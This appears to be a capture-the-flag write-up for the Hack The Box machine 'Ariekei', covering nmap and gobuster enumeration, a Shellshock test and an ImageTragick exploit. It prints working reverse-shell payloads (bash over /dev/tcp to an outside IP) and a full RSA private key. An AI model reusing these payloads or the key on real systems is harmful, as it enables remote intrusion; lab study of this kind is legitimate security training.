### Ariekei

#### keyword 

docker, gobuster -f 

#### Information

```html
PORT     STATE SERVICE   VERSION
22/tcp   open  ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a7:5b:ae:65:93:ce:fb:dd:f9:6a:7f:de:50:67:f6:ec (RSA)
|   256 64:2c:a6:5e:96:ca:fb:10:05:82:36:ba:f0:c9:92:ef (ECDSA)
|_  256 51:9f:87:64:be:99:35:2a:80:a6:a2:25:eb:e0:95:9f (ED25519)
443/tcp  open  ssl/https nginx/1.10.2
_http-server-header: nginx/1.10.2
|_http-title: 400 The plain HTTP request was sent to HTTPS port
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
| tls-nextprotoneg:
|_  http/1.1
1022/tcp open  ssh       OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 98:33:f6:b6:4c:18:f5:80:66:85:47:0c:f6:b7:90:7e (DSA)
|   2048 78:40:0d:1c:79:a1:45:d4:28:75:35:36:ed:42:4f:2d (RSA)
|   256 45:a6:71:96:df:62:b5:54:66:6b:91:7b:74:6a:db:b7 (ECDSA)
|_  256 ad:8d:4d:69:8e:7a:fd:d8:cd:6e:c1:4f:6f:81:b4:1f (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

#### is Docker ???

OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 -> trusty-ubuntu

penSSH 7.2p2 Ubuntu 4ubuntu2.2    ->  xenial-ubuntu



### 443 port

the url https://10.10.10.65/  have some interersting in the ceritficate! 

```json
Certificate Subject Alt Name{

​	Not Critical
​	DNS Name: calvin.ariekei.htb
​	DNS Name: beehive.ariekei.htb

}
```

let us put into hosts [/etc/hosts]()

```dart
10.10.10.65 beehive.ariekei.htb calvin.ariekei.htb
```



### gobuster paramter "-f"  !!

gobuster make the /cgi-bin to /cgi-bin/  by append parameter "-f". if not , the website will make the bad code 404.

```python
 curl -k --ssl https://10.10.10.65/cgi-bin
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /cgi-bin was not found on this server.</p>
<hr>
<address>Apache/2.2.22 (Debian) Server at 10.10.10.65 Port 80</address>
</body></html>
root@ens:~/htb/Ariekei# curl -k --ssl https://10.10.10.65/cgi-bin/
    <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access /cgi-bin/
on this server.</p>
<hr>
<address>Apache/2.2.22 (Debian) Server at 10.10.10.65 Port 80</address>
</body></html>

```

curl -k --ssl https://10.10.10.65/cgi-bin

not same with

curl -k --ssl https://10.10.10.65/cgi-bin/

```
     gobuster -k  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u  https://beehive.ariekei.htb  -f

=====================================================

# Gobuster v2.0.1              OJ Reeves (@TheColonial)

[+] Mode         : dir
[+] Url/Domain   : https://beehive.ariekei.htb/
[+] Threads      : 10
/blog/ (Status: 200)
/cgi-bin/ (Status: 403)
/icons/ (Status: 403)

```

####  cgi-bin 

```
gobuster -k  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u  https://beehive.ariekei.htb/cgi-bin/
/stats (Status: 200)
```

#### shellshock rabbit hole 

get  /cgi-bin/stats HTTP/1.1

<pre>
Tue Mar 19 14:34:37 UTC 2019
14:34:37 up 1 day, 15:53, 0 users, load average: 0.00, 0.02, 0.00
GNU bash, version 4.2.37(1)-release (x86_64-pc-linux-gnu) Copyright (C) 2011 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html> This is free software; you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law.

https://dedetoknotes.blogspot.com/2015/07/shellshock-vulnerability-on-bash-shell.html

Shellshock Vulnerability on Bash Shell

This is how you test your bash shell whether its vulnerable or not for 'shellsock' bug.
Run this on your linux shell (you don't need super user account for this):
 $ env x='() { :;}; echo vulnerable' bash -c "echo this is a test" , but **it fully filters** 

```shell
GET /cgi-bin/stats HTTP/1.1
Host: beehive.ariekei.htb
User-Agent: (){:;};echo;echo

SERVER_SIGNATURE=<address>Apache/2.2.22 (Debian) Server at beehive.ariekei.htb Port 80</address>

HTTP_USER_AGENT=(){:;};echo;echo
HTTP_X_FORWARDED_FOR=10.10.14.27
SERVER_PORT=80
HTTP_HOST=beehive.ariekei.htb
HTTP_X_REAL_IP=10.10.14.27
DOCUMENT_ROOT=/home/spanishdancer/content
SCRIPT_FILENAME=/usr/lib/cgi-bin/stats
REQUEST_URI=/cgi-bin/stats
SCRIPT_NAME=/cgi-bin/stats
HTTP_CONNECTION=close
REMOTE_PORT=55502
```



#### Enum Calvin

```
gobuster -k  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u  https://calvin.ariekei.htb
/upload (Status: 200)
```

#### imagemagick  Tragick  

https://blog.sucuri.net/2016/05/analyzing-imagetragick-exploits-in-the-wild.html

```
push graphic-context
viewbox 0 0 640 480 fill 'url(https://\x22|setsid /bin/bash -i >/dev/tcp/106.186.30.7/443 0<&1 2>&1")'
```

https://github.com/dorkerdevil/ImageTragick_exploit, A tool to exploit imagetragick vulnerability to gain remote code execution.

```shell
#### payload 
push graphic-context
viewbox 0 0 640 480
fill 'url(https://"|setsid /bin/bash -i >& /dev/tcp/10.10.14.27/443 0<&1 2>&1")'
pop graphic-context

```

-----BEGIN RSA PRIVATE KEY-----MIIEpAIBAAKCAQEA8M2fLV0chunp+lPHeK/6C/36cdgMPldtrvHSYzZ0j/Y5cvkR
SZPGfmijBUyGCfqK48jMYnqjLcmHVTlA7wmpzJwoZj2yFqsOlM3Vfp5wa1kxP+JH
g0kZ/Io7NdLTz4gQww6akH9tV4oslHw9EZAJd4CZOocO8B31hIpUdSln5WzQJWrv
pXzPWDhS22KxZqSp2Yr6pA7bhD35yFQ7q0tgogwvqEvn5z9pxnCDHnPeYoj6SeDI
T723ZW/lAsVehaDbXoU/XImbpA9MSF2pMAMBpT5RUG80KqhIxIeZbb52iRukMz3y
5welIrPJLtDTQ4ra3gZtgWvbCfDaV4eOiIIYYQIDAQABAoIBAQDOIAUojLKVnfeG
K17tJR3SVBakir54QtiFz0Q7XurKLIeiricpJ1Da9fDN4WI/enKXZ1Pk3Ht//ylU
P00hENGDbwx58EfYdZZmtAcTesZabZ/lwmlarSGMdjsW6KAc3qkSfxa5qApNy947
QFn6BaTE4ZTIb8HOsqZuTQbcv5PK4v/x/Pe1JTucb6fYF9iT3A/pnXnLrN9AIFBK
/GB02ay3XDkTPh4HfgROHbkwwverzC78RzjMe8cG831TwWa+924u+Pug53GUOwet
A+nCVJSxHvgHuNA2b2oMfsuyS0i7NfPKumjO5hhfLex+SQKOzRXzRXX48LP8hDB0
G75JF/W9AoGBAPvGa7H0Wen3Yg8n1yehy6W8Iqek0KHR17EE4Tk4sjuDL0jiEkWl
WlzQp5Cg6YBtQoICugPSPjjRpu3GK6hI/sG9SGzGJVkgS4QIGUN1g3cP0AIFK08c
41xJOikN+oNInsb2RJ3zSHCsQgERHgMdfGZVQNYcKQz0lO+8U0lEEe1zAoGBAPTY
EWZlh+OMxGlLo4Um89cuUUutPbEaDuvcd5R85H9Ihag6DS5N3mhEjZE/XS27y7wS
3Q4ilYh8Twk6m4REMHeYwz4n0QZ8NH9n6TVxReDsgrBj2nMPVOQaji2xn4L7WYaJ
KImQ+AR9ykV2IlZ42LoyaIntX7IsRC2O/LbkJm3bAoGAFvFZ1vmBSAS29tKWlJH1
0MB4F/a43EYW9ZaQP3qfIzUtFeMj7xzGQzbwTgmbvYw3R0mgUcDS0rKoF3q7d7ZP
ILBy7RaRSLHcr8ddJfyLYkoallSKQcdMIJi7qAoSDeyMK209i3cj3sCTsy0wIvCI
6XpTUi92vit7du0eWcrOJ2kCgYAjrLvUTKThHeicYv3/b66FwuTrfuGHRYG5EhWG
WDA+74Ux/ste3M+0J5DtAeuEt2E3FRSKc7WP/nTRpm10dy8MrgB8tPZ62GwZyD0t
oUSKQkvEgbgZnblDxy7CL6hLQG5J8QAsEyhgFyf6uPzF1rPVZXTf6+tOna6NaNEf
oNyMkwKBgQCCCVKHRFC7na/8qMwuHEb6uRfsQV81pna5mLi55PV6RHxnoZ2wOdTA
jFhkdTVmzkkP62Yxd+DZ8RN+jOEs+cigpPjlhjeFJ+iN7mCZoA7UW/NeAR1GbjOe
BJBoz1pQBtLPQSGPaw+x7rHwgRMAj/LMLTI46fMFAWXB2AzaHHDNPg==
-----END RSA PRIVATE KEY-----
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDwzZ8tXRyG6en6U8d4r/oL/fpx2Aw+V22u8dJjNnSP9jly+RFJk8Z+aKMFTIYJ+orjyMxieqMtyYdVOUDvCanMnChmPbIWqw6UzdV+nnBrWTE/4keDSRn8ijs10tPPiBDDDpqQf21XiiyUfD0RkAl3gJk6hw7wHfWEilR1KWflbNAlau+lfM9YOFLbYrFmpKnZivqkDtuEPfnIVDurS2CiDC+oS+fnP2nGcIMec95iiPpJ4MhPvbdlb+UCxV6FoNtehT9ciZukD0xIXakwAwGlPlFQbzQqqEjEh5ltvnaJG6QzPfLnB6Uis8ku0NNDitreBm2Ba9sJ8NpXh46Ighhh root@arieka